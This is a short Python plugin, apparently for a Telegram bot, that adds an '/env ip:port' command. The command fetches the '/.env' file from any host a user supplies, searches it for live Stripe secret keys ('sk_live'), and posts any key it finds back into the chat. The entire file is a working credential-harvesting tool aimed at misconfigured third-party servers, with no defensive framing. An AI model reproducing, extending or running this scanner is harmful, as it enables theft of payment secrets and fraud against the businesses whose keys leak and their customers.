import os
import requests
from pyrogram import Client, filters
from EQUROBOT import app

def scan_env_file(ip, port):
    url = f"http://{ip}:{port}/.env"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            lines = response.text.splitlines()
            for line in lines:
                if 'sk_live' in line:
                    return f"Found sk_live: {line.strip()}"
            return "sk_live not found in the .env file."
        else:
            return f"Failed to access {url}, status code: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"An error occurred: {e}"

@app.on_message(filters.command("env"))
async def handle_env_scan(client, message):
    if len(message.command) != 2:
        await message.reply("Usage: /env ip:port")
        return

    try:
        ip_port = message.command[1]
        ip, port = ip_port.split(":")
        result = scan_env_file(ip.strip(), port.strip())
        await message.reply(result)  # Await the reply method
    except ValueError:
        await message.reply("Invalid format. Please use: /env ip:port")
